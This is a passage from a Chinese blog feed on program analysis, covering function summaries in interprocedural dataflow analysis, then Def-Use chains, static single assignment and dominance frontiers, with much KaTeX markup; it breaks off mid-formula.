抽象输出的关系，然后下一次经过这个函数时，如果答案已知，就不必重新跑一遍了。但是也很明显，如果函数中的全局变量改变，那么结果就可能不太精确，这也体现了函数式编程在程序分析的优越性。更进一步，因为抽象状态如果分的比较细，那么就会更加精确，然而记忆输入输出映射的表将会非常大，读写开销会很大。而抽象状态分的比较粗，那么就会不精确。考虑到递归函数，那么递归过程中输入的值可能总是不一样。</p><img src="https://cdn.blog-blockchain.xyz/202210212110639.png" alt="image-20221021211011425" style="zoom: 33%;" /><p>例如上图就说明了粗粒度和细粒度两种方式，而且如果满足分配性的话，将会很有帮助。</p><p>再深入一些，假如采用加边的方式会出现不必要的分析，比如 C–&gt;F 是不必要的，因为一般只要入口处到任意一个可达节点即可。但是 C 是不可达的。于是需要做一些改进，<strong>避免不需要的内部可达性计算</strong>。</p><img src="http://cdn.blog-blockchain.xyz/202210240014202.png" alt="1" style="zoom: 80%;" /><p>比较直观的想法如下，具体算法不细究：</p><ol><li>尽量只从 entry 节点出发。</li><li>只有可达的内部节点有多条进来的路径，才复用。</li></ol><h2 id="基于函数摘要">基于函数摘要</h2><p>首先明白为什么要采用函数摘要，它解决了什么问题。首先，根据分析的目标，函数内部的某些操作实际上是「相互抵消」的，如果能够对函数的性质进行抽象，提取摘要，那么就不用每一次都跑这个函数，减少状态转换的步骤。其次，库函数是非常多的，而且库函数功能完全是确定的，没有必要分析库函数内部代码，只需要库函数的摘要信息即可。所以如果节省下来的冗余计算大于摘要花费，则加速 了程序分析。基本思想是：</p><ol><li>将一个过程摘要成一个转换函数。</li><li>库函数可以提前做成摘要，在分析用户代码的时 候直接使用摘要</li></ol><p>具体到之前基于图的数据流分析，天然的契合了函数摘要的思想。因为图的可达性清晰的表示了每个函数的入口和出口的关系。</p><img src="http://cdn.blog-blockchain.xyz/202210231253735.png" alt="image-20221023125337653" style="zoom: 50%;" /><p>但是，由于每个变量都要从入口跑到出口，如果变量很多，那么边将会很复杂。考虑到效率因素，还需要进一步优化。</p><hr><p>为了进一步优化，我们不生成那么庞大的图，而是沿控制流图合并转换函数，采用函数嵌套和合，用一个状态转换函数表达函数。</p><img src="http://cdn.blog-blockchain.xyz/202210231713173.png" alt="image-20221023171319085" style="zoom:50%;" /><p>例如上图可以表示成 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mi>s</mi></msub><mo>=</mo><msub><mi>f</mi><mn>3</mn></msub><mo>∘</mo><mrow><mo fence="true">(</mo><msub><mi>f</mi><mn>1</mn></msub><mo>⊓</mo><msub><mi>f</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">f_s=f_3 \circ\left(f_1 \sqcap f_2\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∘</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊓</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></p><p>注意嵌套表达式的写法，为了避免嵌套，用右结合表示嵌套和<em>合并</em>：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mrow><mo fence="true">(</mo><msub><mi>f</mi><mn>2</mn></msub><mo>∘</mo><msub><mi>f</mi><mn>1</mn></msub><mo fence="true">)</mo></mrow><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>f</mi><mn>2</mn></msub><mrow><mo fence="true">(</mo><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mrow><mo fence="true">(</mo><msub><mi>f</mi><mn>1</mn></msub><mo>⊓</mo><msub><mi>f</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>⊓</mo><msub><mi>f</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}&amp;\left(f_2 \circ f_1\right)(x)=f_2\left(f_1(x)\right) \\&amp;\left(f_1 \sqcap f_2\right)(x)=f_1(x) \sqcap f_2(x)\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.75em;"><span style="top:-3.75em;"><span class="pstrut" style="height:2.84em;"></span><span class="mord"></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:2.84em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.25em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.75em;"><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∘</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊓</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊓</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.25em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>我们继续研究，发现标准型合并和函数嵌套之后，仍然满足标准型，推导和结论见下图。</p><img src="http://cdn.blog-blockchain.xyz/202210231706762.png" alt="image-20221023170639677" style="zoom: 50%;" /><p>交汇的结果是，新生成的变量的并集，需要删除的变量是交集，可证明交汇之后的结果满足半格性质。最大元 Gen 为空集，KILL 为全集。而且可以证明，<strong>采用函数摘要之后的结果，一定会是 sound 的，而且和原来是等价的</strong>。（具体证明实在没看懂）。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/pl/understanding-program-analysis/&quot; title=&quot;（一）初识软件分析&quot;&gt;（一）初识软件分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/data-flow-analysis/&quot; title=&quot;（二）数据流分析基础&quot;&gt;（二）数据流分析基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/LP-souffle/&quot; title=&quot;（三）Datalog和程序分析&quot;&gt;（三）Datalog和程序分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/ssa-and-sparse-analysis/&quot; title=&quot;（四）静态单赋值和稀疏分析&quot;&gt;（四）静态单赋值和稀疏分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/Interprocedural-DFA/&quot; title=&quot;（五）过程间分析&quot;&gt;（五）过程间分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/points-to-analysis/&quot; title=&quot;（六）指向分析&quot;&gt;（六）指向分析&lt;</summary>
        
      
    
    
    
    <category term="program language" scheme="https://www.blog-blockchain.xyz/categories/program-language/"/>
    
    
    <category term="program language" scheme="https://www.blog-blockchain.xyz/tags/program-language/"/>
    
  </entry>
  
  <entry>
    <title>（四）静态单赋值和稀疏分析</title>
    <link href="https://www.blog-blockchain.xyz/pl/ssa-and-sparse-analysis/"/>
    <id>https://www.blog-blockchain.xyz/pl/ssa-and-sparse-analysis/</id>
    <published>2022-10-10T08:40:33.000Z</published>
    <updated>2024-11-15T14:30:54.926Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/pl/understanding-program-analysis/" title="（一）初识软件分析">（一）初识软件分析</a></li><li><a href="/pl/data-flow-analysis/" title="（二）数据流分析基础">（二）数据流分析基础</a></li><li><a href="/pl/LP-souffle/" title="（三）Datalog和程序分析">（三）Datalog和程序分析</a></li><li><a href="/pl/ssa-and-sparse-analysis/" title="（四）静态单赋值和稀疏分析">（四）静态单赋值和稀疏分析</a></li><li><a href="/pl/Interprocedural-DFA/" title="（五）过程间分析">（五）过程间分析</a></li><li><a href="/pl/points-to-analysis/" title="（六）指向分析">（六）指向分析</a></li><li><a href="/pl/abstract-interpretation/" title="（七）抽象解释">（七）抽象解释</a></li><li><a href="/pl/SMT-and-symbolic-excution/" title="（八）SMT和符号执行">（八）SMT和符号执行</a></li><li><a href="/pl/static-analysis-tools/" title="（九）体验静态分析工具">（九）体验静态分析工具</a></li><li><a href="/pl/fuzzing-introduction/" title="（十）Fuzzing 基础">（十）Fuzzing 基础</a></li></ol></blockquote><h1>简介</h1><p>这一章是对数据流分析的拓展和补充，基本内容如下：</p><p>首先从 Def-Use 的角度对控制流图进行简化，但是发现如果变量被多次赋值或者定义，那么简化操作反而会增加更多的边。因此，引入了静态单赋值的方法，所有变量都只赋值一遍，并且再次赋值则视作新的变量。但是分支交汇处的变量，将会不知道来自于其中哪一个分支，因此引入了交汇函数，将所有分支的变量交汇。但是哪些地方需要引入交汇操作呢？探讨了最直接的每个基本块都引入教会操作，但是引入了大量的冗余操作。进而学习了基于支配边界的确定交汇操作的方法。</p><h1>Def-Use</h1><h2 id="提出问题">提出问题</h2><p>之前的数据流分析中，每个数据节点都必须保存所有的值（抽象域），这就导致即使这个数据节点没有对其中某个值，进行任何的读取或者其他操作，也必须分配额外的存储空间。另外，我们之前假设是所有的数据节点都是有关的，要么是正向分析，要么是逆向分析。但是实际上，可能只有少数几个节点之间的变量才会存在依赖关系。</p><p>一个例子见下图：</p><img src="https://cdn.blog-blockchain.xyz/202210092215779.png" alt="image-20221009221521685" style="zoom: 50%;" /><p>以上的问题其实可以通过思考「Def-Use」关系来解决。</p><h2 id="改进数据流分析">改进数据流分析</h2><p>其实很容易理解：<strong>给定变量 x，如果结点 A 可能改变 x 的值，结点 B 可能使用结点 A 改变后的 x 的值，则结点 A 和结点 B 存在 Def-Use 关系。</strong></p><p>如果只是跟踪变量 x，只要跟踪改变了变量 x 和读取了变量 x 的节点即可，中间的不涉及 x 的节点可以忽视。例如，我们分别考虑变量 x, y，那么只要把节点 0-1-3、2 分成两组即可。</p><img src="https://cdn.blog-blockchain.xyz/202210092222200.png" alt="image-20221009222257105" style="zoom:67%;" /><p>虽然上图看起来更加复杂了，但是对于单独的变量，其实少了中间步骤，生成了更加「<strong>稀疏</strong>」的图，效率更加高了。总结如下：</p><ul><li>每个结点只保存自己定义的变量的抽象值。</li><li>只沿着 Def-Use 边传递抽象值。</li><li>通常图上的边数大幅减少，图变得稀 疏（sparse）</li><li>分析速度大大高于原始数据流分析。</li><li>改进前后的分析结果是等价的。</li></ul><h2 id="建立-Def-Use">建立 Def-Use</h2><p>前面看起来很美好，但是这是基于已经提取了 Def-Use 关系了，但是如何建立呢？实际上这个过程叫做 reachable analysis，而这个过程也是需要静态分析的。具体的例子和程序可以见我写的 《<a href="https://www.blog-blockchain.xyz/pl/LP-souffle/">Datalog 和程序分析</a>》 中的应用实例中的数据流分析。复杂度可以参考下图：</p><img src="https://cdn.blog-blockchain.xyz/202210092235123.png" alt="image-20221009223505040" style="zoom:50%;" /><p>另外，**如果定义的变量非常多，改进后的图可能不是更稀疏，反而更加多。**下面是一个例子：</p><img src="https://cdn.blog-blockchain.xyz/202210092248865.png" alt="image-20221009224804794" style="zoom:50%;" /><h1>静态单赋值</h1><h2 id="介绍">介绍</h2><p>核心思想是：<strong>每个变量只被赋值一次</strong>，多次赋值的时候就当作不一样的变量。其实这里的「赋值」和定义，在程序分析中看起来不怎么区分。比如下面的程序，<code>x+=y</code> 之后的 <code>x </code> 和原来的 <code>x</code> 是不同的变量。</p><img src="http://cdn.blog-blockchain.xyz/202210092303556.png" alt="image-20221009230358418" style="zoom:50%;" /><p>但是不同的分支有不同的赋值行为，比如上述的 <code>z</code> 的值是不确定的。那么引入了 <code>z2=𝜙(z0, z1)</code>，表示分支选择，程序分析中表示分支交汇。这样后续就是 <code>x2=x2+z2</code>。</p><p>在 Def-Use 之前先进行静态单赋值，得到了右边第二步的结果，这样增加了变量的个数，但是会在第三步起到减少边的个数的作用。</p><img src="http://cdn.blog-blockchain.xyz/202210092309177.png" alt="image-20221009230925108" style="zoom:50%;" /><h2 id="转化成静态单赋值">转化成静态单赋值</h2><p>但是，<strong>我们不知道哪些变量该在基本块中汇合</strong>。基本块可以理解为一个数据节点，然后汇合是 𝜙 函数。为此，可以在每个基本块中的每个变量都进行汇合。</p><img src="http://cdn.blog-blockchain.xyz/202210092322070.png" alt="image-20221009232225919" style="zoom:50%;" /><p>但是显然这很低效，引入了大量没有必要的操作，生成了没必要的新变量。</p><h2 id="改进转化">改进转化</h2><p>开始探索，**什么时候必须引入交汇函数呢？**已经有成熟的结论了。当且仅当满足如下条件需要引入交汇函数 𝜙：</p><ol><li>至少两条路径在 B 处汇合。</li><li>其中一条经过了对 x 的某个赋值语句 S，但存在其他路径没有经过这条赋值语句。</li><li>语句 S 和 B 之间路径的情况，均不满足条件 1 和 2。</li></ol><img src="http://cdn.blog-blockchain.xyz/202210092332412.png" alt="image-20221009233244368" style="zoom:50%;" /><p>容易理解，即找到最**直接影响 **B 的赋值语句，然后其他分支不会经过这个赋值语句，那么就要交汇。</p><p>为了详细说明，引入如下概念：</p><p>**支配：**结点 A 支配（dominate）结点 B：所有从 Entry 到 B 的路径都要通过 A。</p><p><strong>严格支配</strong>：结点 A 严格支配（Strictly dominate）结点 B：A 支配 B 并且 A 和 B 不是一个结点。</p><img src="http://cdn.blog-blockchain.xyz/202210092336763.png" alt="image-20221009233603722" style="zoom:50%;" /><p>容易理解，比如 main 函数中比如会执行的语句抽象为节点，就是支配节点。每个节点都支配自身，比如上图两个都是支配节点，但是只有左边是非支配节点。</p><p><strong>不严格支配</strong>：至少存在一条路径，在到达 B 之前不经 过 A。</p><p>其实可以看出，不严格支配，其实也是不支配了。</p><p><strong>支配边界</strong>：结点 A 的支配边界中包括 B，当且仅当</p><ul><li>A 支配 B 的某一个前驱结点（注意 A 本身就可以是 B 的前驱节点，任何节点都支配自己）</li><li>A 不严格支配 B</li></ul><p>这其实是包含了非循环和循环的两种情况，分别对应上一张图的左边有右边。</p><hr><p>定义 DF(A) 为 A 的支配边界集合，其中 A 是节点的集合，也就是说 DF(A) 是集合 A 中每个元素的支配边界的并集，表示如下：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mi mathvariant="normal">D</mi><mi mathvariant="normal">F</mi></mrow><mrow><mo fence="true">(</mo><mi>A</mi><mo fence="true">)</mo></mrow><mo>=</mo><munderover><mo>⋃</mo><mrow><mi>a</mi><mo>∈</mo><mi>A</mi></mrow><mrow></mrow></munderover><mrow><mrow><mi mathvariant="normal">D</mi><mi mathvariant="normal">F</mi></mrow><mrow><mo fence="true">(</mo><mi>A</mi><mo fence="true">)</mo></mrow></mrow></mrow><annotation encoding="application/x-tex">\mathrm{DF}\left( A \right) =\bigcup_{a\in A}^{}{\mathrm{DF}\left( A \right)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathrm">DF</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">A</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.6717em;vertical-align:-1.3217em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.35em;"><span style="top:-1.8557em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight">A</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">⋃</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.3217em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">DF</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">A</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></span></p><p>但是如果对一个节点插入了某个变量的交汇函数 𝜙，那么这个节点就相当于增加了新的赋值语句，而这样的行为会影响到后续的节点，因此需要找出闭包。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mrow><mi mathvariant="normal">D</mi><mi mathvariant="normal">F</mi></mrow><mo>+</mo></msup><mrow><mo fence="true">(</mo><mi>A</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>i</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder></mi><msup><mrow><mi mathvariant="normal">D</mi><mi mathvariant="normal">F</mi></mrow><mi>i</mi></msup><mrow><mo fence="true">(</mo><mi>A</mi><mo fence="true">)</mo></mrow><mtext> </mtext><mtext> </mtext><mspace linebreak="newline"></mspace><mi mathvariant="normal">s</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">t</mi><mi mathvariant="normal">.</mi><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mrow><mi mathvariant="normal">D</mi><mi mathvariant="normal">F</mi></mrow><mn>1</mn></msup><mrow><mo fence="true">(</mo><mi>A</mi><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mi mathvariant="normal">D</mi><mi mathvariant="normal">F</mi></mrow><mrow><mo fence="true">(</mo><mi>A</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mrow><mi mathvariant="normal">D</mi><mi mathvariant="normal">F</mi></mrow><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msup><mo>=</mo><mrow><mi mathvariant="normal">D</mi><mi mathvariant="normal">F</mi></mrow><mrow><mo fence="true">(</mo><msubsup><mo>⋃</mo><mrow><mi>j</mi><mo>⩽</mo><mi>i</mi></mrow><mrow></mrow></msubsup><mrow><msup><mrow><mi mathvariant="normal">D</mi><mi mathvariant="normal">F</mi></mrow><mi>j</mi></msup><mrow><mo fence="true">(</mo><mi>A</mi><mo fence="true">)</mo></mrow></mrow><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">\mathrm{DF}^+\left( A \right) =\underset{i\rightarrow \infty}{\lim}\mathrm{DF}^i\left( A \right) \,\,\\\mathrm{s}.\mathrm{t}. \begin{cases}\mathrm{DF}^1\left( A \right) =\mathrm{DF}\left( A \right)\\\mathrm{DF}^{i+1}=\mathrm{DF}\left( \bigcup_{j\leqslant i}^{}{\mathrm{DF}^j\left( A \right)} \right)\\\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0946em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">DF</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8446em;"><span style="top:-3.1362em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">+</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">A</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.6256em;vertical-align:-0.7277em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-2.3723em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">→</span><span class="mord mtight">∞</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop">lim</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7277em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord"><span class="mord mathrm">DF</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8979em;"><span style="top:-3.1362em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span 